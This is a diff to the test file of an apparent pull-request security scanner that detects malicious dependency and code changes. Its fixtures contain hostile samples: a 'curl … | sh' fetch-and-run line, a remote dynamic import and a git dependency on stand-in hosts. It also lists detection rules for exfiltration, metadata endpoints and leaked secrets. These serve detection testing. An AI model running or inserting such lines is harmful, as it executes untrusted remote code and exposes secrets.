@@ -21,7 +21,7 @@ function specWithPackuments(packuments, calls = []) {
       const key = decodeURIComponent(String(url).slice('https://registry.npmjs.org/'.length))
       const value = packuments[key]
       if (value instanceof Error) throw value
-      if (value === 'oversize') return new Response('x'.repeat(26 * 1024 * 1024))
+      if (value === 'oversize') return new Response('x'.repeat(65 * 1024 * 1024))
       if (!value) return new Response('{}', { status: 404 })
       return new Response(JSON.stringify(value))
     },
@@ -121,7 +121,7 @@ describe('malicious PR reviewer', () => {
     assert.ok(!rules(v2Result).includes('review/lockfile-json'))
   })
 
-  test('release age verification handles fresh, old, unverified, fail flag, oversize and full-scan note', async () => {
+  test('release age verification blocks fresh and unverified releases in diff and full scans', async () => {
     const fixture = repo({
       base: { 'package-lock.json': lock({}) },
       head: { 'package-lock.json': lock({ 'node_modules/fresh': pkg('fresh', '1.0.0'), 'node_modules/@scope/fresh-scoped': pkg('@scope/fresh-scoped', '1.0.0'), 'node_modules/old': pkg('old', '1.0.0'), 'node_modules/missing': pkg('missing', '1.0.0'), 'node_modules/big': pkg('big', '1.0.0') }) },
@@ -145,13 +145,14 @@ describe('malicious PR reviewer', () => {
     assert.ok(strict.findings.some(item => item.rule === 'review/release-age-unverified' && item.verdict === 'blocker'))
 
     const full = await runSpec(specWithPackuments(packuments), fixture, ['--full-scan', '--head', fixture.headSha, '--verify-release-age'])
-    assert.ok(full.markdown.includes('Release age verification was skipped in full-scan mode'))
+    assert.ok(full.findings.some(item => item.rule === 'review/release-age-fresh'))
+    assert.ok(full.findings.some(item => item.rule === 'review/release-age-unverified' && item.verdict === 'blocker'))
   })
 
   test('package.json lifecycle, dependency and review-only script changes', async () => {
     const fixture = repo({
       base: { 'package.json': JSON.stringify({ scripts: { test: 'node --test' }, dependencies: { safe: '^1.0.0' } }, null, 2) },
-      head: { 'package.json': JSON.stringify({ scripts: { test: 'node --test --test-reporter spec', install: 'node setup.js', 'test:security': 'node scripts/security/check-all.mjs' }, dependencies: { safe: '^1.0.0', next: '^2.0.0', bad: joined('git', '+https://example.invalid/bad.git'), wide: '*' }, overrides: { safe: '^1.0.1' }, bin: { score: './cli.js' } }, null, 2) },
+      head: { 'package.json': JSON.stringify({ scripts: { test: 'node --test --test-reporter spec', install: 'node setup.js', 'test:security': 'node scripts/security/check-all.mjs' }, dependencies: { safe: '^1.0.0', next: '2.0.0', bad: joined('git', '+https://example.invalid/bad.git'), wide: '*' }, overrides: { safe: '^1.0.1' }, bin: { score: './cli.js' } }, null, 2) },
     })
     const result = await runSpec(specWithPackuments({}), fixture)
     assert.ok(rules(result).includes('review/package-lifecycle-script'))
@@ -192,6 +193,7 @@ describe('malicious PR reviewer', () => {
           joined('curl https://example.invalid/install ', '| sh'),
           "import cp from 'node:child_process'",
           'const name = "x"; import(name)',
+          "import('https://cdn.example.invalid/standalone.js')",
           `const blob = '${'a'.repeat(220)}'`,
           '// eslint-disable-next-line no-console',
           '// security-reviewed: demo/rule -- because fixture',
@@ -201,7 +203,7 @@ describe('malicious PR reviewer', () => {
       },
     })
     const result = await runSpec(specWithPackuments({}), fixture)
-    for (const rule of ['review/exfiltration-host', 'review/public-ip-url', 'review/metadata-endpoint', 'review/secret-github-token', 'review/private-key', 'review/environment-dump', 'review/decode-and-execute', 'review/risky-node-import', 'review/dynamic-import', 'review/large-encoded-blob', 'review/lint-disable', 'review/new-suppression']) {
+    for (const rule of ['review/exfiltration-host', 'review/public-ip-url', 'review/metadata-endpoint', 'review/secret-github-token', 'review/private-key', 'review/environment-dump', 'review/decode-and-execute', 'review/risky-node-import', 'review/dynamic-import', 'review/remote-executable', 'review/large-encoded-blob', 'review/lint-disable', 'review/new-suppression']) {
       assert.ok(rules(result).includes(rule), rule)
     }
     assert.ok(result.findings.some(item => item.file === 'src/app.test.ts' && item.rule === 'review/exfiltration-host' && item.verdict === 'review'))
